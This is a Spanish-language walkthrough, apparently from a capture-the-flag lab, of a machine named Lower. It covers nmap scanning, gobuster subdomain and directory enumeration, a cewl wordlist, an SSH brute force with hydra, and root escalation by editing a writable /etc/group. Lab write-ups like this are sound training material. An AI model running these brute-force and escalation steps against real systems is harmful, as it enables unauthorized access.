---
description: '🔍 Dificultad: Muy Fácil'
---

# Lower

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.63
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.63 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.63
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1059).png" alt=""><figcaption></figcaption></figure>

Miramos el puerto 80 en la que ponemos el dominio **unique.nyx** en **/etc/hosts**.

<figure><img src="../../.gitbook/assets/image (1060).png" alt=""><figcaption></figcaption></figure>

Buscamos subdominios.

```bash
gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://unique.nyx --append-domain
```

<figure><img src="../../.gitbook/assets/image (1061).png" alt=""><figcaption></figcaption></figure>

Encontramos este subdominio por lo que lo añadimos en **/etc/hosts**.

<figure><img src="../../.gitbook/assets/image (1062).png" alt=""><figcaption></figcaption></figure>

Aunque encontramos una nueva web no encontramos nada relevante por lo que hacemos una búsqueda de directorios.

```bash
gobuster dir -u http://tech.unique.nyx -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (1064).png" alt=""><figcaption></figcaption></figure>

No encontramos nada relevante pero si vemos ciertos posibles usuarios por lo que creamos un diccionario.

```bash
cewl http://tech.unique.nyx/ --with-numbers -w usuarios
```

<figure><img src="../../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Realizamos un ataque de fuerza bruta para obtener las credenciales.

```bash
hydra -t 64 -L usuarios -P passwords ssh://192.168.1.63 -F -I
```

<figure><img src="../../.gitbook/assets/image (1065).png" alt=""><figcaption></figcaption></figure>

Teniendo las credenciales nos logueamos.

```bash
ssh lancer@192.168.1.63
```

<figure><img src="../../.gitbook/assets/image (1066).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.

Usamos la herramienta [linPEAS ](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)que nos ayuda a indetificar para obtener acceso.

```bash
scp linpeas.sh lancer@192.168.1.63:/home/lancer
```

<figure><img src="../../.gitbook/assets/image (1067).png" alt=""><figcaption></figcaption></figure>

Al ejecutar el script, descubrimos que contamos con permisos de escritura en el archivo `/etc/group`. Esto nos permite modificar la configuración de los grupos y agregar al usuario `lancer` al grupo `sudo`.

```bash
nano /etc/group
su --login $USER
id
sudo su
```

<figure><img src="../../.gitbook/assets/image (1068).png" alt=""><figcaption></figcaption></figure>
